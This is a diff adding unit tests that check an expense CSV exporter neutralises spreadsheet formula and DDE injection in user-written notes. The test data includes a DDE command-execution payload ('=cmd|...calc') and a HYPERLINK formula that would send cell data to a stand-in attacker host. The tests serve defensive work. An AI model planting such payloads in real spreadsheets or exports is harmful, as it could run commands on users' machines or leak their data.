@@ -103,3 +103,80 @@ describe('expensesToCsv', () => {
     expect(csv).not.toContain('"Taxi fare"');
   });
 });
+
+/** #115 — formula/DDE injection. A note is traveller-written and the exporter opens it in Excel. */
+describe('expensesToCsv — formula injection', () => {
+  /** The Note field of the single data row, decoded back through the RFC-4180 parser. */
+  function noteField(note: string): string {
+    const csv = expensesToCsv([exp({ note })]);
+    return parseCsvRow(csv.slice(HEADER.length + 2, -2))[5];
+  }
+
+  it.each([
+    ['=', "=cmd|'/c calc'!A1"],
+    ['+', '+1+1'],
+    ['-', '-1+cmd|X'],
+    ['@', '@SUM(A1:A9)'],
+    ['TAB', '\t=1+1'],
+    ['CR', '\r=1+1'],
+    ['LF', '\n=1+1'], // stripped as leading whitespace exactly like TAB/CR, so it is a trigger too
+  ])('neutralizes a note starting with %s', (_label, note) => {
+    expect(noteField(note)).toBe(`'${note}`);
+  });
+
+  it('=HYPERLINK exfiltration payload is inert (apostrophe inside the quotes)', () => {
+    const note = '=HYPERLINK("http://evil.test?d="&A1,"Click")';
+    const csv = expensesToCsv([exp({ note })]);
+    // Quoted (it contains commas + quotes) with the apostrophe FIRST inside the quotes, and the
+    // interior double quotes doubled — pinning the compose order, not just the presence of a `'`.
+    expect(csv).toContain(
+      `,"'=HYPERLINK(""http://evil.test?d=""&A1,""Click"")",`,
+    );
+    expect(csv).not.toContain(',\'"=HYPERLINK');
+    expect(noteField(note)).toBe(`'${note}`);
+  });
+
+  it('composes with RFC-4180 quoting: `=1,2` → `"\'=1,2"` and round-trips', () => {
+    const csv = expensesToCsv([exp({ note: '=1,2' })]);
+    expect(csv).toBe(`${HEADER}\r\n,nepal,food,NPR,1000,"'=1,2",,\r\n`);
+    expect(noteField('=1,2')).toBe("'=1,2");
+  });
+
+  it('composes with a trigger AND a quote AND a newline in one value', () => {
+    const note = '=A1&"x"\nsecond line';
+    expect(noteField(note)).toBe(`'${note}`);
+    expect(expensesToCsv([exp({ note })])).toContain(`,"'=A1&""x""\nsecond line",`);
+  });
+
+  it('a negative amount stays a bare number — the Amount column must still sum', () => {
+    const csv = expensesToCsv([exp({ date: '2026-12-10', amount: -42 })]);
+    expect(csv).toBe(`${HEADER}\r\n2026-12-10,nepal,food,NPR,-42,,,\r\n`);
+  });
+
+  it.each(['-42', '+42', '-4.25', '-1e5', '-1E+5'])(
+    'a note that is entirely the number literal %s is left alone',
+    (note) => {
+      expect(noteField(note)).toBe(note);
+    },
+  );
+
+  it.each(['-42+cmd|X', '-4.2.3', '- 42', '-42=1', '+42;=1'])(
+    'a near-number with a payload after it (%s) is still neutralized',
+    (note) => {
+      expect(noteField(note)).toBe(`'${note}`);
+    },
+  );
+
+  it('an ordinary note is byte-identical to the pre-fix output (no stray apostrophe)', () => {
+    const csv = expensesToCsv([
+      exp({ date: '2026-12-10', amount: 1500, note: 'Taxi fare', paidBy: 'Powan' }),
+    ]);
+    expect(csv).toBe(`${HEADER}\r\n2026-12-10,nepal,food,NPR,1500,Taxi fare,Powan,\r\n`);
+    expect(csv).not.toContain("'");
+  });
+
+  it('a trigger char that is not leading is left alone', () => {
+    expect(noteField('Bus 2+2 fare')).toBe('Bus 2+2 fare');
+    expect(noteField('a@b')).toBe('a@b');
+  });
+});
